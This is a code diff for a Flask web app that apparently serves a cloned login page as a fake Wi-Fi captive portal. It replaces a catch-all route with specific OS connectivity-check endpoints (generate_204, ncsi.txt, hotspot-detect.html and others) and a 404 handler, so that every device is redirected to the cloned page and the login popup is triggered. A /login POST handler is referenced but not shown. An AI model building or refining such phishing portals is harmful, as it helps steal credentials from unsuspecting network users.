@@ -18,17 +18,23 @@ def index():
     # Serve the cloned page which now contains both HRD and Login views
     return render_template('index.html')
 
-# Catch-all route to handle captive portal checks (Android, iOS, Windows)
-@app.route('/<path:path>')
-def catch_all(path):
-    # Log what URL the device was trying to reach (useful for debugging)
-    print(f"Device tried to reach: {path}")
-    
-    # Android specific: generate_204 check
-    if path == 'generate_204':
-        return redirect(url_for('index'), code=302)
-        
-    # Redirect everything else to the login page
+# specific captive portal checks
+@app.route('/generate_204')
+@app.route('/ncsi.txt')
+@app.route('/connecttest.txt')
+@app.route('/hotspot-detect.html')
+@app.route('/canonical.html')
+@app.route('/success.txt')
+def captive_portal_check():
+    # Log the check
+    print(f"Captive portal check detected: {request.path}")
+    # Return 302 redirect to trigger the popup
+    return redirect(url_for('index'), code=302)
+
+# Handle 404 errors by redirecting to the login page
+# This acts as a "catch-all" but ONLY if no other route (like static files) matches
+@app.errorhandler(404)
+def page_not_found(e):
     return redirect(url_for('index'), code=302)
 
 @app.route('/login', methods=['POST'])
